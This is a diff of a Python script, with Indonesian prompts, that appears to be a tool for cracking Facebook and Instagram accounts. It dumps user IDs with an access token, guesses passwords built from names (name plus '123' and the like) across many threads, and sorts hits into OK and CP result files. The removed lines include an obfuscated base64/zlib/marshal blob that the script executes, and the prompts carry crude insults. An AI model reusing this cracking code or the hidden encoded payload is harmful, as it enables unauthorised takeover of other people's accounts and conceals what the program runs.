@@ -501,219 +501,128 @@ class __crack__:
             else:
                 continue
         loop += 1
-# GANTI USER AGENT
+#GANTI USER AGENT
 def useragent():
-	print ("\n%s [%s01%s] Ganti user agent "%(P,K,P))
-	print (" [%s02%s] Cek user agent "%(K,P))
-	print (" [%s00%s] Kembali "%(M,P))
-	uas()
-def uas():
-    u = raw_input('\n%s [?] pilih :%s '%(P,K))
-    if u == '':
-        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
-    elif u in("1","01"):
-    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
-    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
-    	try:
-    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
-            if ua in(""):
-            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
-            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
-            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
-            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
-            elif ua in("default","Default","DEFAULT"):
-                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
-                open("data/ua.txt","w").write(ua_)
-                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
-            open("data/ua.txt","w").write(ua);jeda(2)
-            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
-        except KeyboardInterrupt as er:
-			exit ("\x1b[1;91m [!] "+er) 
-    elif u in("2","02"):
-        try:
-        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
-        except IOError:
-        	ua_ = '%s-'%(M)
-    elif u in("0","00"):
-    	menu()
-    else:
-        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
-        
-# MENU INI AJG
-def menu():
-    os.system('clear')
-    try:
-    	romz = open('token.txt', 'r').read()
-    except IOError:
-        print ("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
-    try:
-        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
-        a = json.loads(r.text)
-        nama = a["name"]
-    except KeyError:
-        print("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
-    except requests.exceptions.ConnectionError:
-        exit("%s [!] Kesalahan koneksi "%(M))
-    banner()
-    print ('\n %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
-    print (' [%s01%s] Dump id public'%(K,P)) 
-    print (' [%s02%s] Dump id followers'%(K,P)) 
-    print (' [%s03%s] Dump id reaction post'%(K,P))
-    print (' [%s04%s] Crack cari nama (instagram) '%(K,P))
-    print (' [%s05%s] %sStart crack %s'%(K,P,H,P)) 
-    print (' [%s06%s] Setting user agent'%(K,P)) 
-    print (' [%s07%s] Cek hasil crack'%(K,P)) 
-    #print (' [%s08%s] Gabung group'%(K,P))
-    #print (' [%s09%s] Info script'%(K,P))
-    print (' [%s00%s] Hapus token '%(M,P))
-    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
-    if unik == '':
-        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
-    elif unik in['1','01']:
-        publik(romz)
-    elif unik in['2','02']:
-        followers(romz)
-    elif unik in['3','03']:
-        postingan(romz)
-    elif unik in['4','04']:
-    	igg()
-    elif unik in['5','05']:
-        ngentod().romiy()
-    elif unik in['6','06']:
-    	useragent()
-    elif unik in['7','07']:
-    	print "\n%s [01] Hasil crack akun facebook "%(P)
-        print "%s [02] Hasil crack akun instagram "%(P)
-        c = raw_input('\n%s [?] Menu : %s'%(P,K))
-    	hasill(c)
-    elif unik in['8','08']:
-        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
-    elif unik in['9','09']:
-        print(ingfo)
-    elif unik in['0','00']:
-        print ('')
-        tik();jeda(1);os.system('rm -rf token.txt')
-        jalan('\n%s [√] berhasil terhapus '%(H));exit()
-    else:
-        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
-        
-def hasill(c):
-	if c in[""]:
-		print ("%s[%s!%s] isi yang benar kentod"%(P,M,P));exit()
-	elif c in["1","01"]:
-		try:
-			dirs = os.listdir("hasil")
-			print ("")
-			for file in dirs:
-				print("%s -> %s%s"%(K,P,file));jeda(0.2)
-			print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
-			file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
-			if file == "":
-				print("%s [!] file tidak ada "%(M))
-			total = open("hasil/%s"%(file)).read().splitlines()
-			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-			nm_file = ("%s"%(file)).replace("-", " ")
-			jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
-			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-			for akun in total:
-				fb = akun.replace("\n","")
-				tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
-				print(tling);jeda(0.03)
-			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
-		except (IOError):
-			print("\n%s [!] tidak ada hasil "%(M))
-			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
-	elif c in["2","02"]:
-		print "\n%s [01] Hasil crack akun %sOK "%(P,H)
-        print "%s [02] Hasil crack akun %sCP "%(P,K)
-        while True:
-        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
-		if rom in['1','01']:
-			try:
-				oke = open("okeh.txt", "r").readlines()
-				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-				jalan(" [%s*%s] total akun : %s%s"%(K,P,H,str(len(oke))))
-				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,H));jeda(2)
-				okek = open("okeh.txt", "r").read()
-				print (okek)
-				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-			except IOError,KeyError:
-				exit (M+"\n [!] tidak ada hasil awokawokawok")
-		elif rom in['2','02']:
-			try:
-				cepe = open("cepeh.txt", "r").readlines()
-				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-				jalan(" [%s*%s] total akun : %s%s"%(K,P,K,str(len(cepe))))
-				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,K));jeda(2)
-				cepek = open("cepeh.txt", "r").read()
-				print (cepek)
-				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-			except IOError,KeyError:
-				exit (M+"\n [!] tidak ada hasil awokawokawok")
-		else:
-			exit()
-			
-def igg():
-	print ("\n%s [%s!%s] Cth nama %s: %sRomi "%(P,M,P,M,K))
-	usr_ = raw_input('%s [?] Input nama > %s'%(P,K))
-	jumlah = input('%s [?] Limit user > %s'%(P,K))
-	bff_2 = usr_.replace(" ", "")
-	cr.append("romi_afrizal")
-	mi.append(bff_2+"|"+bff_2)
-	mi.append(bff_2+"_"+"|"+bff_2)
-	for _i_ in range(1, jumlah+1):
-		mi.append(bff_2+str(_i_)+"|"+bff_2)
-		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
-		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
-	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.2)
-	print '%s [%s*%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.2)
-	with ThreadPoolExecutor(max_workers=30) as log:
-		for ro in mi:
-			try:
-				_bff_ = []
-				_r_ = ro.encode("utf-8")
-				_o_ = _r_.split("|")[0]
-				_m_ = _r_.split("|")[1]
-				_i_ = _m_.split()
-				if len(cr) != 1:
-					if len(_o_) >= 6:
-						_bff_.append(_o_)
-						if len(_i_[0]) <= 2:
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-						else:
-							_bff_.append(_i_[0]+"123")
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-					else:
-						_bff_.append(_o_+_o_)
-						if len(_i_[0]) <= 2:
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-						else:
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							_bff_.append(_i_[0]+"123")
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-				else:
-					_bff_.append(_i_[0]+"123")
-					_bff_.append(_i_[0]+"12345")
-					_bff_.append(_o_)
-				log.submit(crack2, _o_, _bff_)
-			except: pass
-	exit("%s• finished"%(H))
+	print ("\n%s[%s01%s]. Ganti user agent "%(P,H,P))
+	print ("%s[%s02%s]. Cek user agent "%(P,H,P))
+	print ("%s[%s00%s]. Kembali "%(P,H,P))
+	__Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s '%(P,M,P,H))
+	uas(__Aang__Sayang__Laura__)
 	
-_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
-      
-if __name__ == '__main__':
-    os.system('git pull')
-    folder()
-    menu()
+def uas(__Aang__Sayang__Laura__):
+	if __Aang__Sayang__Laura__ == '':
+		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
+		uas(__Aang__Sayang__Laura__)
+	elif __Aang__Sayang__Laura__ in("1","01"):
+		print ("%s[%s!%s] Ketik %scancel%s untuk gunakan ua dari script"%(P,H,P,H,P))
+		ua = input("%s[%s!%s] User agent :%s "%(P,H,P,H))
+		if ua in(""):
+			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
+			menu()
+		elif ua in("CANCEL","Cancel","cancel"):
+			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+			open("ua.txt","w").write(ua_);jeda(2)
+			print ("\n%s[%s✓%s]  Berhasil menggunakan user agent script "%(P,H,P));jeda(2)
+			pilihan().menu()
+		open("ua.txt","w").write(ua);time.sleep(2)
+		print ("\n%s[%s✓%s] Berhasil mengganti user agent"%(P,H,P));time.sleep(2)
+		menu()
+	elif __Aang__Sayang__Laura__ in("2","02"):
+		try:
+			ua_ = open('ua.txt', 'r').read();time.sleep(2)
+			print ("%s[%s+%s] User anget lu :%s%s "%(P,H,P,H,ua_));time.sleep(2)
+			input('\n%s[%s!%s] Tekan enter '%(P,H,P))
+			menu()
+		except IOError:
+			ua_ = '%s-'%(M)
+	elif __Aang__Sayang__Laura__ in("0","00"):
+		menu()
+	else:
+		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));time.sleep(2)
+		uas(__Aang__Sayang__Laura__)
+
+#-------------[ PENGATURAN-IDZ ]---------------#
+def setting():
+	print(f'{x}>> 1. Akun Old ')
+	print('>> 2. Akun New ')
+	print('')
+	hu = input('>> Pilih : ')
+	if hu in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
+
+	elif hu in ['2','02']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+#	elif hu in ['3','03']:
+#		for bacot in id:
+#			xx = random.randint(0,len(id2))
+#			id2.insert(xx,bacot)
+	else:
+		print('>> Pilih Yang Bener Kontooll ')
+		exit()
+	print('>> 1. Mobile ')
+#	print('>> 2. Mbasic ')
+#	print('>> 3. Touch  ')
+#	print('>> 4. Mtouch ')
+	print('')
+	hc = input('>> Pilih : ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['']:
+		print('>> Pilih Yang Bener Kontol ')
+		setting()
+#	elif hc in ['2','02']:
+#		method.append('free')
+#	elif hc in ['3','03']:
+#		method.append('touch')
+	elif hc in ['4','04']:
+		method.append('mbasic')
+	else:
+		method.append('mobile')
+	print('')
+	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
+	if _jembot_ in ['']:
+		print('>> Pilih Yang Bener Kontol ')
+		back()
+	elif _jembot_ in ['y','Y']:
+		taplikasi.append('ya')
+	else:
+		taplikasi.append('no')
+	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
+		pwku=input('>> Masukkan Password Tambahan : ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+		pwpluss.append('no')
+	passwrd()
+	
+	#-----------------------[ SYSTEM-CONTROL ]--------------------#
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.mkdir('OK')
+	except:pass
+	try:os.mkdir('CP')
+	except:pass
+	try:os.mkdir('/sdcard/ALVINO-DUMP')
+	except:pass
+	try:os.system('touch .prox.txt')
+	except:pass
+	try:os.system('pkg install play-audio')
+	except:pass
+	try:os.system('clear')
+	except:pass
+	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}——> {h}Alvino Sehat Selalu Yah\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Semoga Harimu Menyenangkan Sayang{x}')
+	time.sleep(3)
+	login()
